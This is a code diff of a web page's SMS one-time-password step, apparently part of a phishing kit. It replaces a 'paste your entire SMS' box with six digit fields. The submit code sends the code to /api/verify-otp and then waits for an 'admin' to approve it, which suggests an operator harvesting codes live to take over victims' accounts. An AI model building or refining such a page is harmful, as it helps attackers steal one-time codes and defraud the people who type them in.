@@ -433,29 +433,33 @@
     </div>
     <div class="hbg2"><span></span><span></span><span></span></div>
   </div>
-  <div class="otp-body-wrap"> <div class="otp-card"> <h2>SMS Verification</h2> <p class="otp-hint">Copy the entire SMS received on your phone and paste it below. We'll automatically extract your code.</p> <div class="otp-phone" id="otpPh">+263712345678</div> <!-- Inline messages for OTP page --> <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div> <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div> <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>       <!-- Waiting for admin approval indicator -->
+  <div class="otp-body-wrap">
+    <div class="otp-card">
+      <h2>OTP Verification</h2>
+      <p class="otp-hint">Enter the OTP sent to your phone number</p>
+      <div class="otp-phone" id="otpPh">+263712345678</div>
+
+      <!-- Inline messages for OTP page -->
+      <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
+      <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+      <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
+
+      <!-- Waiting for admin approval indicator -->
       <div class="waiting-box" id="pinWait">
         <div class="wb-spinner"></div>
         <p>Waiting for admin to verify your details…</p>
       </div>
 
       <div id="otpInputSection">
-        <div class="otp-paste-container" style="margin-bottom: 20px;">
-          <textarea 
-            id="smsPasteBox" 
-            placeholder="Paste your full OTP SMS text here..." 
-            rows="3" 
-            style="width: 100%; max-width: 100%; padding: 12px; border: 2px dashed #ccc; border-radius: 8px; font-family: inherit; box-sizing: border-box; resize: none;"
-            oninput="extractOtpCode(this.value)"
-          ></textarea>
-          
-          <div id="extractedFeedback" style="margin-top: 10px; font-size: 14px; display: none;">
-            Detected Code: <strong id="detectedCode" style="font-size: 18px; color: #1BC8D4; letter-spacing: 2px;"></strong>
-          </div>
-          <input type="hidden" id="finalOtpValue">
+        <div class="otp-inputs">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,4)" id="o4">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,5)" id="o5">
         </div>
-
-         <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">17</span> seconds</div>
+        <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">17</span> seconds</div>
         <button class="btn-otp" id="bOtp" onclick="doOtp()">SUBMIT</button>
       </div>
     </div>
@@ -899,24 +903,17 @@
   // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
   // ══════════════════════════════════════════════════════
   async function doOtp() {
-    // UPDATED: Read directly from the extracted hidden input instead of the 6 separate boxes
-    const otp = document.getElementById('finalOtpValue') ? document.getElementById('finalOtpValue').value : '';
-    
+    const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
     if (otp.length < 6) {
-      showOtpMsg('warning', 'Please paste a valid SMS message containing a 6-digit verification code.');
+      showOtpMsg('warning', 'Please enter all 6 digits of your OTP.');
       return;
     }
 
     hideOtpMsgs();
 
     let c = 3;
-    // Safe check in case otpVT doesn't exist in your updated layout
-    const vtEl = document.getElementById('otpVT');
-    if (vtEl) vtEl.textContent = 'Please wait… (' + c + 's)';
-    
-    const mOtpEl = document.getElementById('mOtp');
-    if (mOtpEl) mOtpEl.classList.add('show');
-    
+    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
+    document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
 
     const countdown = setInterval(() => {
@@ -934,7 +931,7 @@
       const data = await res.json();
 
       clearInterval(countdown);
-      if (mOtpEl) mOtpEl.classList.remove('show');
+      document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
         showOtpMsg('success', 'OTP submitted. Waiting for admin to approve…');
@@ -946,13 +943,13 @@
 
     } catch (err) {
       clearInterval(countdown);
-      if (mOtpEl) mOtpEl.classList.remove('show');
+      document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
       showOtpMsg('error', 'Network error. Please check your connection.');
     }
   }
 
-  //══════════════════════════════════════════════════════
+  // ══════════════════════════════════════════════════════
   // POLL /api/check-otp-status
   // ══════════════════════════════════════════════════════
   let otpPollInterval = null;
